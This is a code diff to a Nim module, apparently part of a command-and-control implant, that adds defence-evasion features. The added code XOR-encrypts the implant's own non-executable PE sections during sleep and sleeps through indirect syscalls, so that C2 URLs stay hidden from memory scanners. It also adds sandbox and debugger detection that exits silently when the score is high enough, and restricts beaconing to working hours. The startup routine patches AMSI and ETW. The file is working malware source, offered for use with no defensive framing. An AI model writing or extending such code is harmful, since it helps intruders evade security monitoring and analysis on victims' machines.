@@ -1,7 +1,10 @@
-## OPSEC evasion: AMSI, ETW, sleep mask, PE header wipe, HWBP clear, PPID spoof.
+## OPSEC evasion: AMSI, ETW, sleep mask, PE header wipe, HWBP clear, PPID spoof,
+## sandbox detection, working-hours gating.
 
 import winim/lean, winim/inc/tlhelp32
 import std/[os, strutils, random]
+import config
+import ./syscalls
 
 # ── Byte patching helper ──────────────────────────────────────────────────────
 proc patchBytes(address: LPVOID; patch: openArray[byte]) =
@@ -60,27 +63,52 @@ proc clearHWBP*() =
   ctx.Dr6 = 0; ctx.Dr7 = 0
   discard SetThreadContext(h, addr ctx)
 
-# ── Sleep masking (XOR encrypt during sleep) ──────────────────────────────────
-var xorSleepKey: uint64 = 0
-
-proc initSleepKey*() =
-  ## Generate a random 8-byte XOR key for sleep masking.
-  randomize()
-  xorSleepKey = uint64(rand(high(int64)))
+# ── Sleep masking (XOR encrypt non-exec PE sections during sleep) ─────────────
+const XOR_SLEEP_KEY: byte = 0xA7
 
 proc sleepMasked*(ms: int) =
-  ## PAGE_NOACCESS on a dummy anonymous region during sleep — hides heap from memory scanners.
+  ## XOR-encrypts all non-executable PE sections (hides C2 URLs, strings, imports
+  ## from memory scanners) then sleeps via NtDelayExecution (indirect syscall),
+  ## then decrypts in-place. Executable sections (.text) are left untouched to
+  ## avoid crashing when the sleep returns into our own code.
   if ms <= 0: return
-  var dummySize: SIZE_T = 4096
-  let dummy = VirtualAlloc(nil, dummySize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
-  if dummy != nil:
+
+  let base = GetModuleHandleW(nil)
+  if base == 0:
+    sleepViaNt(ms)
+    return
+
+  let dos = cast[ptr IMAGE_DOS_HEADER](base)
+  let nt  = cast[PIMAGE_NT_HEADERS](cast[int](base) + dos.e_lfanew)
+  let nsec = int(nt.FileHeader.NumberOfSections)
+  let firstSec = IMAGE_FIRST_SECTION(nt)
+
+  # Encrypt: XOR each non-executable section with the key.
+  for i in 0 ..< nsec:
+    let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
+    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: continue
+    if sh.SizeOfRawData == 0: continue
+    let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
+    let size    = sh.SizeOfRawData.int
     var old: DWORD
-    discard VirtualProtect(dummy, dummySize, PAGE_NOACCESS, addr old)
-    sleep(ms)
-    discard VirtualProtect(dummy, dummySize, PAGE_READWRITE, addr old)
-    discard VirtualFree(dummy, 0, MEM_RELEASE)
-  else:
-    sleep(ms)
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
+    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), old, addr old)
+
+  # Sleep via indirect syscall — NtDelayExecution lives in ntdll, not our .text.
+  sleepViaNt(ms)
+
+  # Decrypt: same XOR pass restores original bytes.
+  for i in 0 ..< nsec:
+    let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
+    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: continue
+    if sh.SizeOfRawData == 0: continue
+    let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
+    let size    = sh.SizeOfRawData.int
+    var old: DWORD
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
+    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
+    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), old, addr old)
 
 # ── PPID spoofing for child processes ─────────────────────────────────────────
 const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)
@@ -138,10 +166,82 @@ proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool =
   discard CloseHandle(pi.hProcess)
   return true
 
+# ── Sandbox / analysis environment detection ──────────────────────────────────
+proc sandboxCheck*() =
+  ## Score-based sandbox detector. Exits silently if score ≥ 4.
+  if IsDebuggerPresent() != 0: ExitProcess(0)  # immediate
+
+  var score = 0
+
+  var si: SYSTEM_INFO
+  GetSystemInfo(addr si)
+  if si.dwNumberOfProcessors < 2: inc score
+
+  var ms: MEMORYSTATUSEX
+  ms.dwLength = sizeof(ms).DWORD
+  if GlobalMemoryStatusEx(addr ms) != 0:
+    if ms.ullTotalPhys < DWORDLONG(512 * 1024 * 1024): score += 3
+    elif ms.ullTotalPhys < DWORDLONG(1024 * 1024 * 1024): inc score
+
+  var totalBytes: ULONGLONG = 0
+  discard GetDiskFreeSpaceExW(newWideCString("C:\\"), nil,
+    cast[PULARGE_INTEGER](addr totalBytes), nil)
+  if totalBytes > 0 and totalBytes < ULONGLONG(40) * 1024 * 1024 * 1024: inc score
+
+  var ubuf = newWideCString(newString(256))
+  if GetEnvironmentVariableW(newWideCString("USERNAME"), ubuf, 256) > 0:
+    let uname = ($ubuf).toLowerAscii()
+    for s in ["sandbox", "malware", "virus", "analyst", "cuckoo", "maltest", "vmuser"]:
+      if s in uname: score += 3; break
+
+  if score >= 4: ExitProcess(0)
+
+# ── Working-hours gating ──────────────────────────────────────────────────────
+var workingHoursDyn* = WorkingHours  ## mutable at runtime via CONFIG task
+
+proc inWorkingHours*(): bool =
+  ## Returns true if the current time is inside the configured window.
+  ## Empty WorkingHours string = always beacon.
+  if workingHoursDyn == "": return true
+  let idx = workingHoursDyn.find('-')
+  if idx < 1: return true
+  let sp = workingHoursDyn[0..<idx].split(':')
+  let ep = workingHoursDyn[idx+1..^1].split(':')
+  if sp.len != 2 or ep.len != 2: return true
+  var sh, sm, eh, em: int
+  try:
+    sh = parseInt(sp[0]); sm = parseInt(sp[1])
+    eh = parseInt(ep[0]); em = parseInt(ep[1])
+  except: return true
+  var st: SYSTEMTIME
+  GetLocalTime(addr st)
+  let cur = int(st.wHour) * 60 + int(st.wMinute)
+  let s = sh * 60 + sm
+  let e = eh * 60 + em
+  if s <= e: return cur >= s and cur < e
+  else: return cur >= s or cur < e  # overnight window e.g. 22:00-06:00
+
+proc sleepUntilWorkHours*() =
+  ## Sleep until the next working-hours window opens.
+  if workingHoursDyn == "": return
+  let idx = workingHoursDyn.find('-')
+  if idx < 1: return
+  let sp = workingHoursDyn[0..<idx].split(':')
+  if sp.len != 2: return
+  var sh, sm: int
+  try: sh = parseInt(sp[0]); sm = parseInt(sp[1])
+  except: return
+  var st: SYSTEMTIME
+  GetLocalTime(addr st)
+  let cur = int(st.wHour) * 60 + int(st.wMinute)
+  let s = sh * 60 + sm
+  let waitMin = if cur < s: s - cur else: (24 * 60 - cur) + s
+  if waitMin > 0: sleepMasked(waitMin * 60 * 1000)
+
 # ── Apply all evasion at startup ──────────────────────────────────────────────
 proc applyEvasion*() =
+  sandboxCheck()     # exit early if sandbox / analysis env detected
   patchAMSI()
   patchETW()
   disableETWProcess()
-  initSleepKey()
   # clearHWBP() and wipeMZHeader() available as operator commands via SHELL
